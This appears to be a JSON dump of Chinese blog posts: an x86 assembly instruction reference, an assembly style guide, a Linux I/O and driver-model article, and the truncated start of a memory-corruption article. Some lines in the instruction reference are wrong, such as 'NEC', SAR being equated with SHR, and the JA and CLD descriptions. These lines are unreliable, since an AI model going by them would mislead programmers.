把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈. BSWAP 交换32位寄存器里字节的顺序 XCHG 交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数) CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL/AX/EAX ) XADD 先交换再累加.( 结果在第一个操作数里 ) XLAT 字节查表转换. BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即0-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL ) 输入输出端口传送指令 IN I/O端口输入. ( 语法: IN 累加器, {端口号│DX} ) OUT I/O端口输出. ( 语法: OUT {端口号│DX},累加器 ) 输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535. 目的地址传送指令. LEA 装入有效地址. 例: LEA DX,string ;把偏移地址存到DX. LDS 传送目标指针,把指针内容装入DS. 例: LDS SI,string ;把段地址:偏移地址存到DS:SI. LES 传送目标指针,把指针内容装入ES. 例: LES DI,string ;把段地址:偏移地址存到ES:DI. LFS 传送目标指针,把指针内容装入FS. 例: LFS DI,string ;把段地址:偏移地址存到FS:DI. LGS 传送目标指针,把指针内容装入GS. 例: LGS DI,string ;把段地址:偏移地址存到GS:DI. LSS 传送目标指针,把指针内容装入SS. 例: LSS DI,string ;把段地址:偏移地址存到SS:DI. 标志传送指令. LAHF 标志寄存器传送,把标志装入AH. SAHF 标志寄存器传送,把AH内容装入标志寄存器. PUSHF 标志入栈. POPF 标志出栈. PUSHD 32位标志入栈. POPD 32位标志出栈. 算术运算指令 ADD 加法. ADC 带进位加法. INC 加 1. AAA 加法的ASCII码调整. DAA 加法的十进制调整. SUB 减法. SBB 带借位减法. DEC 减 1. NEC 求反(以 0 减之). CMP 比较.(两操作数作减法,仅修改标志位,不回送结果). AAS 减法的ASCII码调整. DAS 减法的十进制调整. MUL 无符号乘法. IMUL 整数乘法. 以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算) AAM 乘法的ASCII码调整. DIV 无符号除法. IDIV 整数除法. 以上两条,结果回送: 商回送AL,余数回送AH, (字节运算); 或商回送AX,余数回送DX, (字运算). AAD 除法的ASCII码调整. CBW 字节转换为字. (把AL中字节的符号扩展到AH中去) CWD 字转换为双字. (把AX中的字的符号扩展到DX中去) CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去) CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去) 逻辑运算指令 AND 与运算. or 或运算. XOR 异或运算. NOT 取反. TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果). SHL 逻辑左移. SAL 算术左移.(=SHL) SHR 逻辑右移. SAR 算术右移.(=SHR) ROL 循环左移. ROR 循环右移. RCL 通过进位的循环左移. RCR 通过进位的循环右移. 以上八种移位指令,其移位次数可达255次. 移位一次时, 可直接用操作码. 如 SHL AX,1.移位&gt;1次时, 则由寄存器CL给出移位次数.如 MOV CL,04 SHL AX,CL 串指令 DS:SI 源串段寄存器 :源串变址. ES:DI 目标串段寄存器:目标串变址. CX 重复次数计数器. AL/AX 扫描值. D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量. Z标志 用来控制扫描或比较操作的结束. MOVS 串传送. ( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. ) CMPS 串比较. ( CMPSB 比较字符. CMPSW 比较字. ) SCAS 串扫描. 把AL或AX的内容与目标串作比较,比较结果反映在标志位. LODS 装入串.把源串中的元素(字或字节)逐一装入AL或AX中. ( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. ) STOS 保存串.是LODS的逆过程. REP 当CX/ECX&lt;&gt;0时重复. REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复. REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复. REPC 当CF=1且CX/ECX&lt;&gt;0时重复. REPNC 当CF=0且CX/ECX&lt;&gt;0时重复. 程序转移指令 无条件转移指令 (长转移) JMP 无条件转移指令 CALL 过程调用 RET/RETF过程返回. 条件转移指令 (短转移,-128到+127的距离内) 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 JA/JNBE 不小于或不等于时转移. JAE/JNB 大于或等于转移. JB/JNAE 小于转移. JBE/JNA 小于或等于转移. 以上四条,测试无符号整数运算的结果(标志C和Z). JG/JNLE 大于转移. JGE/JNL 大于或等于转移. JL/JNGE 小于转移. JLE/JNG 小于或等于转移. 以上四条,测试带符号整数运算的结果(标志S,O和Z). JE/JZ 等于转移. JNE/JNZ 不等于时转移. JC 有进位时转移. JNC 无进位时转移. JNO 不溢出时转移. JNP/JPO 奇偶性为奇数时转移. JNS 符号位为 “0” 时转移. JO 溢出转移. JP/JPE 奇偶性为偶数时转移. JS 符号位为 “1” 时转移. 循环控制指令(短转移) LOOP CX不为零时循环. LOOPE/LOOPZ CX不为零且标志Z=1时循环. LOOPNE/LOOPNZ CX不为零且标志Z=0时循环. JCXZ CX为零时转移. JECXZ ECX为零时转移. 中断指令 INT 中断指令 INTO 溢出中断 IRET 中断返回 处理器控制指令 HLT 处理器暂停, 直到出现中断或复位信号才继续. WAIT 当芯片引线TEST为高电平时使CPU进入等待状态. ESC 转换到外处理器. LOCK 封锁总线. NOP 空操作. STC 置进位标志位. CLC 清进位标志位. CMC 进位标志取反. STD 置方向标志位. CLD 清方向标志位. STI 置中断允许位. CLI 清中断允许位. 伪指令 DW 定义字(2字节). PROC 定义过程. ENDP 过程结束. SEGMENT 定义段. ASSUME 建立段寄存器寻址. ENDS 段结束. END 程序结束. 处理机控制指令 标志处理指令 CLC（进位位置0指令） CMC（进位位求反指令） STC（进位位置为1指令） CLD（方向标志置1指令） STD（方向标志位置1指令） CLI（中断标志置0指令） STI（中断标志置1指令） NOP（无操作） HLT（停机） WAIT（等待） ESC（换码） LOCK（封锁） 本文链接： http://www.meng.uno/articles/711069a/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"},{"name":"ASM","slug":"Language/ASM","permalink":"http://www.meng.uno/categories/Language/ASM/"}],"tags":[{"name":"ASM","slug":"ASM","permalink":"http://www.meng.uno/tags/ASM/"},{"name":"汇编","slug":"汇编","permalink":"http://www.meng.uno/tags/汇编/"}]},{"title":"汇编语言代码规范","slug":"asm-principle","date":"2016-07-16T09:31:04.000Z","updated":"2018-02-18T10:38:20.009Z","comments":true,"path":"articles/b0b4f7ec/","link":"","permalink":"http://www.meng.uno/articles/b0b4f7ec/","excerpt":"随着程序功能的增加和版本的提高，程序越来越复杂，源文件也越来越多，风格规范的源程序会对软件的升级、修改和维护带来极大的方便，要想开发一个成熟的软件产品，必须在编写源程序的时候就有条不紊，细致严谨。 在编程中，在程序排版、注释、命名和可读性等问题上都有一定的规范，虽然编写可读性良好的代码并不是必然的要求（世界上还有难懂代码比赛，看谁的代码最不好读懂！），但好的代码风格实际上是为自己将来维护和使用这些代码节省时间。 变量和函数的命名 匈牙利表示法 匈牙利表示法主要用在变量和子程序的命名，这是现在大部分程序员都在使用的命名约定。“匈牙利表示法”这个奇怪的名字是为了纪念匈牙利籍的Microsoft","text":"随着程序功能的增加和版本的提高，程序越来越复杂，源文件也越来越多，风格规范的源程序会对软件的升级、修改和维护带来极大的方便，要想开发一个成熟的软件产品，必须在编写源程序的时候就有条不紊，细致严谨。 在编程中，在程序排版、注释、命名和可读性等问题上都有一定的规范，虽然编写可读性良好的代码并不是必然的要求（世界上还有难懂代码比赛，看谁的代码最不好读懂！），但好的代码风格实际上是为自己将来维护和使用这些代码节省时间。 变量和函数的命名 匈牙利表示法 匈牙利表示法主要用在变量和子程序的命名，这是现在大部分程序员都在使用的命名约定。“匈牙利表示法”这个奇怪的名字是为了纪念匈牙利籍的Microsoft程序员Charles Simonyi，他首先使用了这种命名方法。 匈牙利表示法用连在一起的几个部分来命名一个变量，格式是类型前缀加上变量说明，类型用小写字母表示，如用h表示句柄，用dw表示double word，用sz表示以0结尾的字符串等，说明则用首字母大写的几个英文单词组成，如TimeCounter，NextPoint等，可以令人一眼看出变量的含义来，在汇编语言中常用的类型前缀有： 123456789 b 表示bytew 表示worddw 表示dwordh 表示句柄lp 表示指针sz 表示以0结尾的字符串lpsz 表示指向0结尾的字符串的指针f 表示浮点数st 表示一个数据结构 这样一来，变量的意思就很好理解： 12345 hWinMain 主窗口的句柄dwTimeCount 时间计数器，以双字定义szWelcome 欢迎信息字符串，以0结尾lpBuffer 指向缓冲区的指针stWndClass WNDCLASS结构 由于匈牙利表示法既描述了变量的类型，又描述了变量的作用，所以能帮助程序员及早发现变量的使用错误，如把一个数值当指针来使用引发的内存页错误等。 对于函数名，由于不会返回多种类型的数值，所以命名时一般不再用类型开头，但名称还是用表示用途的单词组成，每个单词的首字母大写。Windows API是这种命名方式的绝好例子，当人们看到ShowWindow，GetWindowText，DeleteFile和GetCommandLine之类的API函数名称时，恐怕不用查手册，就能知道它们是做什么用的。比起int 21h/09h和int 13h/02h之类的中断调用，好处是不必多讲的。 对匈牙利表示法的补充 使用匈牙利表示法已经基本上解决了命名的可读性问题，但相对于其他高级语言，汇编语言有语法上的特殊性，考虑下面这些汇编语言特有的问题： 对局部变量的地址引用要用lea指令或用addr伪操作，全局变量要用offset；对局部变量的使用要特别注意初始化问题。如何在定义中区分全局变量、局部变量和参数？ 汇编的源代码占用的行数比较多，代码行数很容易膨胀，程序规模大了如何分清一个函数是系统的API还是本程序内部的子程序？ 实际上上面的这些问题都可以归纳为区分作用域的问题。为了分清变量的作用域，命名中对全局变量、局部变量和参数应该有所区别，所以我们需要对匈牙利表示法做一些补充，以适应Win32汇编的特殊情况，下面的补充方法是笔者提出的，读者可以参考使用： 全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线，在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。 在内部子程序的名称前面加下划线，以便和系统API区别。 如下面是一个求复数模的子程序，子程序名前面加下划线表示这是本程序内部模块，两个参数——复数的实部和虚部用_dwX和_dwY表示，中间用到的局部变量@dwResult则用@号开头： 123456789101112131415 _Calc proc _dwX,_dwY local @dwResult finit fild _dwX fld st(0) fmul ;i * i fild _dwY fld st(0) fmul ;j * j fadd ;i * i + j * j fsqrt ;sqrt(i * i + j * j) fistp @dwResult ;put result mov eax,@dwResult ret_Calc endp 代码的书写格式 排版方式 程序的排版风格应该遵循以下规则。 首先是大小写的问题，汇编程序中对于指令和寄存器的书写是不分大小写的，但小写代码比大写代码便于阅读，所以程序中的指令和寄存器等要采用小写字母，而用equ伪操作符定义的常量则使用大写，变量和标号使用匈牙利表示法，大小写混合。 其次是使用Tab的问题。汇编源程序中Tab的宽度一般设置为8个字符。在语法上，指令和操作数之间至少有一个空格就可以了，但指令的助记符长度是不等长的，用Tab隔开指令和操作数可以使格式对齐，便于阅读。如： 123 xor eax,eaxfistp dwNumberxchg eax,ebx 上述代码的写法就不如下面的写法整齐： 123 xor eax, eax fistp dwNumberxchg eax, ebx 还有就是缩进格式的问题。程序中的各部分采用不同的缩进，一般变量和标号的定义不缩进，指令用两个Tab缩进，遇到分支或循环伪指令再缩进一格，如： 12345678910111213 .datadwFlag dd ?.codestart: mov eax,dwFlag .if dwFlag == 1 call _Function1 .else call _Function2 .endif 合适的缩进格式可以明显地表现出程序的流程结构，也很容易发现嵌套错误，当缩进过多的时候，可以意识到嵌套过深，该改进程序结构了。 本文链接： http://www.meng.uno/articles/b0b4f7ec/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"},{"name":"ASM","slug":"Language/ASM","permalink":"http://www.meng.uno/categories/Language/ASM/"}],"tags":[{"name":"代码规范","slug":"代码规范","permalink":"http://www.meng.uno/tags/代码规范/"},{"name":"ASM","slug":"ASM","permalink":"http://www.meng.uno/tags/ASM/"},{"name":"汇编语言","slug":"汇编语言","permalink":"http://www.meng.uno/tags/汇编语言/"}]},{"title":"I/O体系结构","slug":"io-system","date":"2016-07-15T04:28:52.000Z","updated":"2018-04-10T05:46:42.630Z","comments":true,"path":"articles/d0c0e94a/","link":"","permalink":"http://www.meng.uno/articles/d0c0e94a/","excerpt":"I/O体系结构 虚拟文件系统利用底层函数，调用每个设备的操作，那么这些操作是如何在设备上执行的，操作系统又是如何知道设备的操作是什么的呢？这些是由操作系统决定的。 我们知道，操作系统的工作，是依赖于数据通路的，它们让信息得以在CPU、RAM、I/O设备之间传递。这些数据通路称为 总线。这就包括数据总线（PCI、ISA、EISA、SCSI等）、地址总线、控制总线。I/O总线，指的就是用于CPU和I/O设备之间通信的数据总线。I/O体系的通用结构如图所示： 那么CPU是如何通过I/O总线和I/O设备交互呢？这首先得从内存和外设的编址方式说起。第一种是“独立编址”，也就是内存和外设分开编址，I","text":"I/O体系结构 虚拟文件系统利用底层函数，调用每个设备的操作，那么这些操作是如何在设备上执行的，操作系统又是如何知道设备的操作是什么的呢？这些是由操作系统决定的。 我们知道，操作系统的工作，是依赖于数据通路的，它们让信息得以在CPU、RAM、I/O设备之间传递。这些数据通路称为 总线。这就包括数据总线（PCI、ISA、EISA、SCSI等）、地址总线、控制总线。I/O总线，指的就是用于CPU和I/O设备之间通信的数据总线。I/O体系的通用结构如图所示： 那么CPU是如何通过I/O总线和I/O设备交互呢？这首先得从内存和外设的编址方式说起。第一种是“独立编址”，也就是内存和外设分开编址，I/O端口有独立的地址空间，这也被称为I/O映射方式。每个连接到I/O总线上的设备，都分配了自己的I/O地址集（在I/O地址空间中），它被称为I/O端口。in、out等指令用语CPU对I/O端口进行读写。在执行其中一条指令时，CPU使用地址总线选择所请求的I/O端口，使用数据总线在CPU寄存器和端口之间传送数据。这种方式编码逻辑清晰，速度快，但空间有限。 第二种是“统一编址”，也被称为内存映射方式，I/O端口还可以被映射到内存地址空间（这也正是现代硬件设备倾向于使用的方式），这样CPU就可以通过对内存操作的指令，来访问I/O设备，并且和DMA结合起来。这种方式更加统一，易于使用。它实际上使用了ioremap()。自从PCI总线出现后，不论采用I/O映射还是内存映射方式，都需要将I/O端口映射到内存地址空间。 每个I/O设备的I/O端口都是一组寄存器：控制寄存器、状态寄存器、输入寄存器和输出寄存器。内核会纪录分配给每个硬件设备的I/O端口。 设备驱动程序模型 在内核中，设备不仅仅需要完成相应的操作，还要对其电源管理、资源分配、生命周期等等行为进行统一的管理。因此，内核建立了一个统一的设备模型，提取设备操作的共同属性，进行抽象，并且为添加设备、安装驱动提供统一的接口。它们本身并不代表具体的对象，只是用来维持对象间的层次关系。 这里首先要提的是sysfs文件系统。和/proc类似，安装于/sys目录，其目的是表现出设备驱动程序模型间的层次关系。在驱动程序模型当中，有三种重要的数据结构（旧版本），自上到下分别是subsystem、kset、kobject。如果要理解这个模型中，每个数据结构的作用，就必须理解它们和操作系统中的什么东西相对应。它们均对应着**/sys中的目录**。kobject是这个对象模型中，所有对象的基类。kset本身首先是一个kobject，而它又承担着一个kobject容器的作用，它把kobject组织成有序的目录；subsys则是更高的一层抽象，它本身首先是一个kset。驱动、总线、设备都能够用设备驱动程序模型中的对象表示。 设备驱动程序模型中的组件 设备驱动程序模型建立在几个基本数据结构之上，它们描述了总线、设备、设备驱动器等等。这里，我们来看看它们的数据结构。首先，device用来描述设备驱动程序模型中的设备。 struct device { struct device *parent;//父设备 struct kobject kobj; //对应的kobject const char *init_name; //初始化名 const struct device_type *type;//设备的类型 struct mutex mutex; //驱动的互斥量 struct bus_type *bus; //设备在什么类型的总线 struct device_driver *driver; //设备的驱动 void *driver_data; //驱动私有数据指针 struct dev_pm_info power; struct dev_pm_domain *pm_domain; //dma相关变量 u64 *dma_mask; u64 coherent_dma_mask; unsigned long dma_pfn_offset; struct device_dma_parameters *dma_parms; struct list_head dma_pools; struct dma_coherent_mem *dma_mem; dev_t devt; //dev目录下的描述符 u32 id; spinlock_t devres_lock; struct list_head devres_head; struct klist_node knode_class; struct class *class; //类 void (*release)(struct device *dev);//释放设备描述符时候的回调函数 }; 首先，可以看到device中包含有一个kobject，还包含有它相关驱动对象。所有的device对象，全部收集在devices_kset中，它对应着/sys/devices中。设备的引用计数则是由kobject来完成的。device还会被嵌入到一个更大的描述符中，例如pci_dev，它除了包含dev之外，还有PCI所特有的一些数据结构。device_add完成了新的device的添加工作。我注意到，error = bus_add_device(dev);，也就是说device的添加会把它和bus关联起来。 再来看看驱动程序的结构。其数据结构为device_driver。相对于设备的数据结构来说，它相对较为简单：对于每个设备驱动，都有几个通用的方法，分别用语处理热插拔、即插即用、电源管理、探查设备等。同样，驱动也会被嵌入到一个更大的描述符中，例如pci_driver。 struct device_driver { const char *name; //驱动名 struct bus_type *bus; //总线描述符 struct module *owner; const char *mod_name; //模块名 bool suppress_bind_attrs; /* disables bind/unbind via sysfs */ const struct of_device_id *of_match_table; const struct acpi_device_id *acpi_match_table; int (*probe) (struct device *dev); //探测设备 int (*remove) (struct device *dev); //移除设备 void (*shutdown) (struct device *dev); //断电方法 int (*suspend) (struct device *dev, pm_message_t state);//低功率 int (*resume) (struct device *dev); //恢复方法 const struct attribute_group **groups; const struct dev_pm_ops *pm; //电源管理的操作 struct driver_private *p; }; 为什么这里没有kobject呢？它实际上保存在了driver_private当中，这个结构和device_driver是双向链接的。 struct driver_private { struct kobject kobj; struct klist klist_devices; struct klist_node knode_bus; struct module_kobject *mkobj; struct device_driver *driver; }; driver的添加，通过调用driver_register()来完成，它同样包含一个函数：bus_add_driver()，也就是将driver添加到某个bus。 再来看看总线的结构。bus是连接device和driver的桥梁，bus中的很多代码，都是为了让device找到driver来设计的。总线的数据结构如下： struct bus_type { const char *name; const char *dev_name; struct device *dev_root; struct device_attribute *dev_attrs; /* use dev_groups instead */ const struct attribute_group **bus_groups; const struct attribute_group **dev_groups; const struct attribute_group **drv_groups; //检查驱动是否支持特定设备 int (*match)(struct device *dev, struct device_driver *drv); //回调事件，在kobject状态改变时调用 int (*uevent)(struct device *dev, struct kobj_uevent_env *env); //探测设备 int (*probe)(struct device *dev); //从总线移除设备 int (*remove)(struct device *dev); //掉电 void (*shutdown)(struct device *dev); int (*online)(struct device *dev); int (*offline)(struct device *dev); //改变电源状态和恢复 int (*suspend)(struct device *dev, pm_message_t state); int (*resume)(struct device *dev); const struct dev_pm_ops *pm; const struct iommu_ops *iommu_ops; struct subsys_private *p; struct lock_class_key lock_key; }; 同样，总线也有一个subsys_private，它保存了kobject。but_type中定义了一系列的方法。例如，当内核检查一个给定的设备是否可以由给定的驱动程序处理时，就会执行match方法。可以用bus_for_each_drv()和bus_for_each_dev()函数分别循环扫描drivers和device两个链表中的所有元素，来进行match。 设备文件 设备驱动程序使得硬件设备，能以特定方式，响应控制设备的编程接口（一组规范的VFS函数，open，read，lseek，ioctl等），这些函数都是由驱动程序来具体实现的。在设备文件上发出的系统调用，都会由内核转化为对应的设备驱动程序函数，因此设备驱动必须被注册，也即构造一个device_driver，并且加入到设备驱动程序模型中。在注册时，内核会试图进行一次match。注意，这个注册的过程基本driver_register通常不会在驱动中直接调用，但我们但驱动通常都会间接的调用它来完成注册。 遵循linux“一切皆文件”的原则，I/O设备同样可以当作设备文件来处理，它和磁盘上的普通文件的交互方式一样，例如都可以通过write()系统调用写入数据。设备文件可以通过mknod()节点来创建，它们保存在/dev/目录下。 linux当中，硬件设备可以花费为两种：字符设备和块设备。其中，块设备指的是可以随机访问的设备，例如硬盘、软盘等；而字符设备则指的是声卡、键盘这样的设备。设备文件同样在VFS当中，但它的索引节点没有指向磁盘数据的指针，相反地它对应一个标识符（包含一个主设备号和一个次设备号）。VFS会在设备文件打开时，改变一个设备文件的缺省文件操作，让它去调用和设备相关的操作。 字符设备驱动程序 这里我们以字符设备驱动程序为例。首先，字符设备的驱动，在linux系统中，是以cdev结构来表示的： struct cdev { struct kobject kobj; struct module *owner; const struct file_operations *ops; struct list_head list; //包括的inode的devices dev_t dev; unsigned int count; }; 现在让我们回顾一下inode的数据结构： struct inode { ... union { struct pipe_inode_info *i_pipe; struct block_device *i_bdev; struct cdev *i_cdev; }; ... } 我们看到了cdev指针的影子，可见cdev和inode确实是直接相关的。要实现驱动，首先就要对cdev进行初始化，注册字符设备。驱动的安装，首先要分配cdev结构体、申请设备号并初始化cdev。注意，驱动程序是如何和刚才我们所说的设备驱动模型建立联系的呢？实际上在初始化cdev的时候，就调用了kobject_init()，在模型中添加了一个kobject。 随后，驱动要注册cdev，也即调用cdev_add()函数。这个工作主要是由kobj_map()来实现的，它是一个数组。对于每一类设备，都有一个全局变量，例如字符设备的cdev_map，块设备的bdev_map。最后要进行硬件资源的初始化。 int cdev_add(struct cdev *p, dev_t dev, unsigned count) { int error; p-&gt;dev = dev; p-&gt;count = count; error = kobj_map(cdev_map, dev, count, NULL, exact_match, exact_lock, p); if (error) return error; kobject_get(p-&gt;kobj.parent); return 0; } kobj_map的结构如下，它用来保存设备号和kobject的对应关系 struct kobj_map { struct probe { struct probe *next; dev_t dev; unsigned long range; struct module *owner; kobj_probe_t *get; int (*lock)(dev_t, void *); void *data; } *probes[255]; struct mutex *lock; }; 不过到现在为止，我们都还没有说明，程序在访问字符设备时，是如何去调用正确的方法的。我们曾提到过，open()系统调用会改变字符文件对象的f_op字段，将默认文件操作替换为驱动的操作。在字符设备文件创建时，会调用init_special_inode来进行索引节点对象的初始化。其inode的操作(def_chr_fops)只包含一个默认的文件打开操作，也即chrdev_open。它会根据inode，首先利用cdev_map，找到对应的kobject，随后再进一步找到cdev，然后从中提取出文件操作的函数fops，并把它填充到file当中去。 static int chrdev_open(struct inode *inode, struct file *filp) { const struct file_operations *fops; struct cdev *p; struct cdev *new = NULL; int ret = 0; spin_lock(&amp;cdev_lock); p = inode-&gt;i_cdev; if (!p) { struct kobject *kobj; int idx; spin_unlock(&amp;cdev_lock); kobj = kobj_lookup(cdev_map, inode-&gt;i_rdev, &amp;idx);//获取对应的kobject if (!kobj) return -ENXIO; new = container_of(kobj, struct cdev, kobj); spin_lock(&amp;cdev_lock); /* Check i_cdev again in case somebody beat us to it while we dropped the lock. */ p = inode-&gt;i_cdev; if (!p) { inode-&gt;i_cdev = p = new; list_add(&amp;inode-&gt;i_devices, &amp;p-&gt;list);//将device加入到cdev的list中去 new = NULL; } else if (!cdev_get(p)) ret = -ENXIO; } else if (!cdev_get(p)) ret = -ENXIO; spin_unlock(&amp;cdev_lock); cdev_put(new); if (ret) return ret; ret = -ENXIO; fops = fops_get(p-&gt;ops) if (!fops) goto out_cdev_put; replace_fops(filp, fops);//替换file当中的fops return ret; } 这里很奇怪的是，我们并没有看到类似前面提到的driver_register()、device_register()这样的函数。实际上这里并没有真正创建一个设备，而只是说创建了一个接口，所以有这样一个这个问题：为什么cdev_add没有产生设备节点？对于这个问题，我们应该理解为cdev和driver/device二者是配套工作的，cdev用来和用户交互，而device则是内核中的结构。 另一个问题是，在上面的过程中，似乎没有提及设备文件的创建。实际上，作为一个rookie，那么设备文件常常是用 mknod命令手动创建的。当然，linux自然也提供了自动创建的借口，那就是利用udev来实现，调用device_create()函数。 当然，这个例子只是为了说明，操作系统的驱动程序是如何工作的，为什么对I/O设备的操作可以抽象成对设备文件的操作，程序在操作I/O文件时，是如何使用正确的操作的。 块设备的驱动 和字符设备类似，操作系统中的块设备，也是以文件的形式来访问。这里有一个很拗口的问题：磁盘是一个块设备，块设备有一个块设备文件。那么访问块设备文件和访问普通的磁盘上的文件有什么关系呢？ 不论是块设备文件还是普通的文件，它们都是通过VFS来统一访问的。只不过对于一个普通文件，它可能已经在RAM中了（高速缓存机制），因此它的访问可能会直接在RAM中进行；但如果说要修改磁盘上的内容，或者文件内容不在RAM中，则也会间接地，通过块设备文件进行访问。这个驱动模型可以用这样一个图表示： 这里我们只考虑最底层的情况：内核从块设备读取数据。为了从块设备中读取数据，内核必须知道数据的物理位置，而这正是映射层的工作。映射层的工作包括两步： 根据文件所在文件系统的块，将文件拆分成块，然后内核能够确定请求数据所在的块号； 映射层调用文件系统具体的函数，找到数据在磁盘上的位置，也就是完成文件块号，到逻辑块号的映射关系。 随后的工作在通用块层进行，内核在这一层，启动I/O操作。通常一个I/O操作对应一组连续的块，我们把它称为bio，它用来搜集底层需要的信息。 I/O调度层负责根据内核中的各种策略，把待处理的I/O数据传送请求，进行归类。它的作用是把物理介质上相邻的数据请求，进行合并，一并处理。 最后一层也就是通过块设备的驱动来完成了，它向I/O接口发送适当的命令，从而进行实际的数据传送。 通用块层 通用块层负责处理所有块设备的请求，其核心数据结构就是bio。它代表一次块设备I/O请求。 struct bio { struct bio *bi_next; //请求队列中的下一个bio struct block_device *bi_bdev; //块设备描述符指针 unsigned long bi_flags; /* status, command, etc */ unsigned long bi_rw; //rw位 struct bvec_iter bi_iter; unsigned int bi_phys_segments;//合并后有多少个段 unsigned int bi_seg_front_size; unsigned int bi_seg_back_size; atomic_t bi_remaining;//剩余的bio_vec bio_end_io_t *bi_end_io;//bio结束的回调函数 void *bi_private; unsigned short bi_vcnt; //bio中biovec的数量 unsigned short bi_max_vecs;//最多能有多少个 atomic_t bi_cnt; //结构体的使用计数 struct bio_vec *bi_io_vec; //bio_vec数组 }; 在这个数据结构中，还包含了一个bio_vec。这是什么意思呢？在linux中，相邻数据块被称为一个段，每个bio_vec对应一个内存页中的段。在io操作期间，bio是会一直更新的，其中的bi_iter用来在数组中遍历，按每个段来执行下一步的操作。 那么当通用块层收到一个I/O请求操作时，会发生什么呢？首先内核会为这次操作分配bio描述符，并对它进行填充。随后通用块层会调用generic_make_request，这个函数的作用很明确：它会进行一系列检查和设置，保证bio中的信息是针对整个磁盘，而不是磁盘分区的；随后获取这个块设备相关的请求队列q，调用q-&gt;make_request_fn，把bio插入请求队列中去。 I/O调度层 在块设备上，每个I/O请求操作都是异步处理的，通用块层的请求会被加入块设备的请求队列中，每个块设备都会单独地进行I/O的调度，这样能够有效提高磁盘的性能。 前面提到，通用块层会调用一个q-&gt;make_request_fn，向I/O调度程序发送一个请求，该函数会进一步调用__make_request()。这个函数的目的，就是把bio放进请求队列当中：（1）如果请求队列是空的，就构造一个新的请求插入；（2）如果请求队列不是空的，但是bio不能合并（不能合并到某个请求的头和尾），也构造一个新的请求插入；（3）请求队列不是空的，并且bio可以合并，就合并到对应的请求中去。注意，bio，请求和请求队列的关系如下： -- request_queue |-- request1 |-- bio0 |-- request2 |-- bio1 |-- bio2 而I/O的调度，就是对请求队列进行排序，针对磁盘的特点，降低寻道的次数。这里说说几个常见的算法： CFQ完全公平队列：默认的调度算法，完全公平排队。每个进程/线程都单独创建一个队列，并且用上面提到的策略进行管理。队列间采用时间片的方式来分配I/O。 Deadline最后期限算法：在电梯调度的基础上，根据读写请求的“最后期限”进行排序，并通过读期限短于写期限来保证写操作不被饿死。 预期I/O算法：与最后期限类似，但是在读操作时，会预先判断当前的进程是否马上会有读操作，并且优先地进行处理。 NOOP：适用于固态硬盘，不进行任何优化。 总而言之，I/O调度层的作用，就是把请求的队列重新排序，并逐个交给块设备驱动程序进行处理。 块设备驱动程序 I/O调度层排序好的请求，会由块设备的驱动程序来处理。同样，块设备也遵循着我们前面提到的驱动程序模型：块设备对应一个device，而驱动程序对应了一个device_driver。对于块设备来说，驱动程序也要通过register_blkdev()注册一个设备号。随后，驱动程序要初始化gendisk描述符，以及它所包含的设备操作表fops。在此之后，是“请求队列”的初始化，以及中断程序的设置：要为设备注册IRQ线。最后要把磁盘注册到内核（add_disk）,并把它激活。 当一个块设备文件被open()时，内核同样也要为它初始化操作。对于块设备来说，其默认的文件操作如下： const struct file_operations def_blk_fops = { .open = blkdev_open, .release = blkdev_close, .llseek = block_llseek, .read = new_sync_read, .write = new_sync_write, .read_iter = blkdev_read_iter, .write_iter = blkdev_write_iter, .mmap = generic_file_mmap, .fsync = blkdev_fsync, .unlocked_ioctl = block_ioctl, #ifdef CONFIG_COMPAT .compat_ioctl = compat_blkdev_ioctl, #endif .splice_read = generic_file_splice_read, .splice_write = iter_file_splice_write, }; dentry_open()方法会调用blkdev_open()。它（1）首先会获取块设备的描述符：如果块设备已经打开，则可以通过inode-&gt;i_bdev直接获取，否则则需要根据设备号去查找块设备描述符。（2）获取块设备相关的gendisk地址，get_gendisk是通过设备号来找到gendisk的。（3）如果是第一次打开块设备，则要根据它是整盘还是分区，进行相应的设置和初始化。（4）如果不是第一次打开，只需要按需要执行自定义的open()函数就行了。 补充：I/O的监控方式 轮询：CPU重复检查设备的状态寄存器，直到寄存器的值表明I/O操作已经完成了。 中断：设备发出中断信号，告知I/O操作已经完成了，数据放在对应的端口，当数据缓冲满了时，由CPU去取，CPU需要控制数据传输的过程。 DMA：由CPU的DMA电路来辅助数据的传输，CPU不需要参与内存和IO之间的传输过程，只需要通过DMA的中断来获取信息。DMA能够在所有数据处理完时才通知CPU处理。 本文链接： http://www.meng.uno/articles/d0c0e94a/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"I/O","slug":"I-O","permalink":"http://www.meng.uno/tags/I-O/"}]},{"title":"内存攻击与保护","slug":"momery","date":"2016-07-11T03:49:10.000Z","updated":"2018-04-10T05:46:42.635Z","comments":true,"path":"articles/9c8c0fa/","link":"","permalink":"http://www.meng.uno/articles/9c8c0fa/","excerpt":"memory corruption Step 1: 一个指针变成非法的指针 第一种:越过它所引用的对象的边界(out-of-bounds pointer)，spatial error 第二种:它所指向的对象已经被释放(dangling pointer)，temporal error Bugs lead to Out-of-bounds: 1. allocation failure --> null pointer 2. 过多的增／减 array pointer --> buffer overflow/underflow 3. indexing bugs --> pointer","text":"memory corruption Step 1: 一个指针变成非法的指针 第一种:越过它所引用的对象的边界(out-of-bounds pointer)，spatial error 